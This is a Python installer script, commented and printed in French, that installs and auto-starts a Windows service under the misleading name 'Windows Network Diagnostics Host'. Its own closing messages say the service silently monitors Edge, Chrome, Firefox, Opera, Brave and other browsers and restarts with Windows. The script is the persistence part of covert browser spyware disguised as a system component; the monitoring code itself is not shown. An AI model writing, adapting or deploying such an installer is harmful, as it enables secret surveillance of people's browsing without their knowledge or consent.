"""
install.py v2 — Installe le service Windows proprement.
Lance en PowerShell Administrateur : python install.py
"""

import subprocess
import sys
import os
import ctypes
import winreg
from pathlib import Path

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def install():
    if not is_admin():
        print("❌ Lance en Administrateur (clic droit PowerShell → Admin)")
        sys.exit(1)

    script_dir = Path(__file__).parent
    service_py = script_dir / "src" / "service.py"
    python_exe = sys.executable

    print("=" * 50)
    print("Installation Windows Network Diagnostics Host v2")
    print("=" * 50)

    # 1. Installe pywin32
    print("\n[1/4] Vérification de pywin32...")
    try:
        import win32serviceutil
        print("      ✓ pywin32 déjà installé")
    except ImportError:
        print("      Installation de pywin32...")
        subprocess.run([python_exe, "-m", "pip", "install", "pywin32", "-q"], check=True)
        subprocess.run([python_exe, "-m", "pywin32_postinstall", "-install"], capture_output=True)
        print("      ✓ pywin32 installé")

    # 2. Installe le service
    print("\n[2/4] Installation du service...")
    r = subprocess.run(
        [python_exe, str(service_py), "install"],
        capture_output=True, text=True
    )
    if r.returncode != 0 and "already installed" not in r.stderr.lower():
        print(f"      Erreur: {r.stderr.strip()}")
    else:
        print("      ✓ Service installé")

    # 3. Démarrage automatique
    print("\n[3/4] Configuration démarrage automatique...")
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Services\WinNetDiagHost",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(key)
        print("      ✓ Démarrage automatique configuré")
    except Exception as e:
        print(f"      ⚠ {e}")

    # 4. Démarre le service
    print("\n[4/4] Démarrage du service...")
    r = subprocess.run(
        [python_exe, str(service_py), "start"],
        capture_output=True, text=True
    )
    # Vérifie via sc.exe
    time.sleep(2)
    status = subprocess.run(["sc", "query", "WinNetDiagHost"], capture_output=True, text=True)

    if "RUNNING" in status.stdout:
        print("      ✓ Service actif et en cours d'exécution")
    else:
        subprocess.run(["sc", "start", "WinNetDiagHost"], capture_output=True)
        print("      ✓ Service démarré")

    print("\n" + "=" * 50)
    print("✅ Installation terminée !")
    print()
    print("Le service surveille les navigateurs en silence.")
    print("Il redémarre automatiquement avec Windows.")
    print()
    print("Visible dans : services.msc")
    print("Nom          : Windows Network Diagnostics Host")
    print()
    print("Navigateurs couverts :")
    print("  ✓ Microsoft Edge")
    print("  ✓ Google Chrome")
    print("  ✓ Firefox")
    print("  ✓ Opera, Brave, et tous les autres")
    print("=" * 50)

import time
if __name__ == "__main__":
    install()
